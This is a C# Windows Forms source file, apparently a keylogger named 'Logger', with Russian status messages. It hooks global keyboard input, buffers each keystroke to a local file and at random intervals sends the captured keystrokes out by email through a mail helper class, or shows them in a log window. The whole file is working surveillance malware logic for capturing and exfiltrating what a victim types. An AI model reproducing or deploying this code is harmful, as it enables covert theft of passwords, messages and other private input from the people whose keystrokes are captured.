using System;
using DLL;
using System.Windows.Forms;

namespace Logger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        private ToFile f;
        private ToMail mail;
        private int R = 0;
        private int i = 0;
        private bool Run = false;
        private void Form1_Load(object sender, EventArgs e)
        {
            Random rand = new Random();
            R = rand.Next(10, 20);
            //R = 5;
            f = new ToFile();
            MailInfo info = new MailInfo();
            mail = new ToMail(info);
            Hook.KeyPress += Hook_KeyPress;
        }
        private bool TrySending()
        {
            if (i < R)
            {
                i++;
                return Run;
            }
            else
            {
                i = 0;
                Run = !Run;
                return Run;
            }
        }
        private void Hook_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (TrySending())
            {
                string s = "";
                status.ForeColor = System.Drawing.Color.Green;
                status.Text = "Отправка пошла";
                if (f.Exists())
                {
                    s = f.GetFromFile();
                }
                if (rbServer.Checked)
                {
                    log.Text += s;
                    log.Text += e.KeyChar;
                }
                else
                {
                    if (!mail.Send(s + e.KeyChar))
                        log.Text += "\nОшибка отправки на почту!\n";
                    Run = !Run;
                    i = 0;
                }
            }
            else
            {
                if (!f.Exists())
                {
                    status.Text = "Сервер недоступен, запись в файл";
                    status.ForeColor = System.Drawing.Color.DarkRed;
                }
                if (!f.Send(e.KeyChar.ToString()))
                    MessageBox.Show("Ошибка записи в файл", "Error");
            }
        }
    }
}
